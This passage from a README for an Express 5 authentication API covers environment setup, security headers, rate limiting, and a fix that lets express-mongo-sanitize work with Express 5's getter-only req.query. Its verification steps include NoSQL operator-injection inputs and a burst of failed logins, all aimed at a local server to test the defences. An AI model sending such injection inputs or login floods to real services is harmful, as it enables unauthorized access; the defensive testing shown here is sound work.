npm install
```

### 3. Configure Environment

Update the `.env` file:

```env
NODE_ENV=development
MONGO_URI=mongodb://localhost:27017/authentication

ACCESS_TOKEN_SECRET=super-secure-and-ultra-long-secret-key-12345
ACCESS_TOKEN_EXPIRY=15m
REFRESH_TOKEN_SECRET=super-secure-and-ultra-long-refresh-secret-key-12345
REFRESH_TOKEN_EXPIRY=7d

FRONTEND_URL=http://127.0.0.1:5173

EMAIL_ADMIN=admin@swiftcart.com
EMAIL_HOST=sandbox.smtp.mailtrap.io
EMAIL_PORT=2525
EMAIL_USERNAME=your_mailtrap_username
EMAIL_PASSWORD=your_mailtrap_password
EMAIL_SUPPORT=support@swiftcart.com
```

### 4. Start Development Server

```bash
npm run dev
```

### 5. Verify Security Headers

```bash
# Check that helmet headers are present
curl -I http://localhost:4000/api/v1/courses

# Expected headers in response:
# Content-Security-Policy: default-src 'self'
# X-Content-Type-Options: nosniff
# X-Frame-Options: SAMEORIGIN
# Strict-Transport-Security: max-age=15552000; includeSubDomains
# X-DNS-Prefetch-Control: off
```

### 6. Test Rate Limiting

```bash
# Send 6 rapid login requests — the 6th should be rejected with 429
for i in {1..6}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST http://localhost:4000/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email": "test@example.com", "password": "wrong"}'
done
# Expected: 401 401 401 401 401 429
```

---

## 📋 Available Scripts

| Command       | Description                                                                    |
| ------------- | ------------------------------------------------------------------------------ |
| `npm start`   | Start server with Node.js (`node --env-file=.env server.js`)                   |
| `npm run dev` | Start development server with hot-reload (`nodemon --env-file=.env server.js`) |

---

## 🔐 Environment Variables

| Variable               | Description                                         | Example                                    |
| ---------------------- | --------------------------------------------------- | ------------------------------------------ |
| `NODE_ENV`             | Application mode                                    | `development`                              |
| `MONGO_URI`            | MongoDB connection string                           | `mongodb://localhost:27017/authentication` |
| `ACCESS_TOKEN_SECRET`  | Secret for signing access JWTs                      | (long random string)                       |
| `ACCESS_TOKEN_EXPIRY`  | Access token lifetime                               | `15m`                                      |
| `REFRESH_TOKEN_SECRET` | Secret for signing refresh JWTs                     | (different long random string)             |
| `REFRESH_TOKEN_EXPIRY` | Refresh token lifetime                              | `7d`                                       |
| `FRONTEND_URL`         | Frontend URL for CORS origin + password reset links | `http://127.0.0.1:5173`                    |
| `EMAIL_HOST`           | SMTP host                                           | `sandbox.smtp.mailtrap.io`                 |
| `EMAIL_PORT`           | SMTP port                                           | `2525`                                     |
| `EMAIL_USERNAME`       | SMTP username (Mailtrap)                            | (from Mailtrap dashboard)                  |
| `EMAIL_PASSWORD`       | SMTP password (Mailtrap)                            | (from Mailtrap dashboard)                  |
| `EMAIL_ADMIN`          | Admin email address                                 | `admin@swiftcart.com`                      |
| `EMAIL_SUPPORT`        | Support email (sender address)                      | `support@swiftcart.com`                    |

---

## 🛠 Troubleshooting

### Express 5: `TypeError: Cannot set property query of #<IncomingMessage> which has only a getter`

#### Symptom

When sending requests to any endpoint (e.g., `POST /api/v1/auth/refresh`, `GET /api/v1/courses`), the server crashes or responds with a `500 Internal Server Error`:

```json
{
  "status": "error",
  "error": {
    "statusCode": 500,
    "status": "error"
  },
  "message": "Cannot set property query of #<IncomingMessage> which has only a getter",
  "stack": "TypeError: Cannot set property query of #<IncomingMessage> which has only a getter\n    at ...\\express-mongo-sanitize\\index.js:113:18\n    at Array.forEach (<anonymous>)\n    at ...\\express-mongo-sanitize\\index.js:110:44"
}
```

#### Cause

- **Express 5 Breaking Change**: In Express 5 (`^5.2.1`), `req.query` was redesigned as a **getter-only** accessor property on `express.request.prototype` (`{ get: [Function: query], set: undefined }`).
- **Legacy Middleware Conflict**: `express-mongo-sanitize` (v2.2.0) executes `req[key] = target` across `['body', 'params', 'headers', 'query']`. At line 113, assigning to `req['query']` fails because the getter has no corresponding setter.
- **Custom XSS Conflict**: Custom `xssClean` middlewares assigning `req.query = sanitize(req.query)` hit the exact same error in strict mode.

#### Solution

Add the `Object.defineProperty` compatibility middleware to `server.js` **immediately before** `app.use(mongoSanitize())`:

```javascript
// server.js — Placed before mongoSanitize() and xssClean
app.use((req, res, next) => {
  if (req.query) {
    Object.defineProperty(req, "query", {
      value: { ...req.query },
      writable: true,
      enumerable: true,
      configurable: true,
    });
  }
  next();
});

app.use(mongoSanitize());
app.use(xssClean);
```

#### Verification

Send a request with query parameters to confirm that `200 OK` is returned and malicious operators are stripped:

```bash
# Request with NoSQL operator in query string
curl "http://localhost:4000/api/v1/courses?\$gt=1"

# Should return 200 OK (sanitized) instead of 500 TypeError
```

---

## 🔑 Key Concepts Summary

| Concept                                   | Description                                                                                 |
| ----------------------------------------- | ------------------------------------------------------------------------------------------- |
| **5-Layer Middleware Pipeline**           | Ordered security stack: helmet → cors → rateLimiter → bodyParsers → sanitizers → routes     |
| **Middleware order matters**              | Placing sanitizers before body parsers means they see `undefined` — injections pass through |
| **Express 5 `req.query` Breaking Change** | `req.query` is getter-only on prototype (`set: undefined`) — direct assignment throws error |
| **`Object.defineProperty` Bridge**        | Redefines `req.query` as an own writable property on `req` so sanitizers can mutate params  |
| **helmet**                                | Sets 15+ HTTP security headers with secure defaults in a single `app.use()` call            |
| **CORS with credentials**                 | `credentials: true` + explicit `origin` required for cross-origin cookie-based auth         |
| **Preflight requests**                    | Browser `OPTIONS` requests for non-simple requests — CORS must handle them before routes    |
| **Global rate limiter**                   | `app.use("/api", globalLimiter)` — 100 req/15 min per IP across all API routes              |
| **Route-specific rate limiter**           | `authLimiter` applied directly in `auth.routes.js` on `POST /login` — 5 attempts/hr         |
| **`standardHeaders: "draft-8"`**          | Sends standardized `RateLimit-Limit`, `RateLimit-Remaining`, `RateLimit-Reset` headers      |
| **`express.json({ limit: "10kb" })`**     | Rejects oversized payloads with `413 Payload Too Large` before body parsing                 |
| **`mongoSanitize()`**                     | Strips `$` and `.` keys from input — prevents `{ "$gt": "" }` NoSQL injection               |
| **`xssClean`**                            | Custom middleware using `sanitize-html` — recursively strips all HTML/JS tags from input    |
| **Operator translation**                  | `?price[lte]=100` → `{ price: { $lte: 100 } }` via regex `replace` in the service layer     |
| **Excluded fields**                       | `["page", "sort", "limit", "fields"]` removed from filter object to prevent false filtering |
| **Parallel execution**                    | `Promise.all([countDocuments, query])` — count and data fetched simultaneously              |
| **Pagination guards**                     | `Math.max(1, page)`, `Math.min(100, limit)`, out-of-range page → 404                        |
| **`sendResponse` extra param**            | 5th argument `{ meta }` is spread into the root of the JSON response                        |
